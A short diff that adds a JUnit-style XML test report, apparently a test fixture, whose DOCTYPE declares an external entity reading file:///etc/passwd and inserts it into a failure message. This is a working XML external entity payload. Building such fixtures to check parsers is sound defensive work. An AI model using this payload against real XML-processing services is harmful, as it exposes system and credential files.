@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE testsuite [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<testsuite name="evil">
+  <testcase name="steal" classname="evil.Test">
+    <failure message="&secret;" type="java.lang.AssertionError">&secret;</failure>
+  </testcase>
+</testsuite>
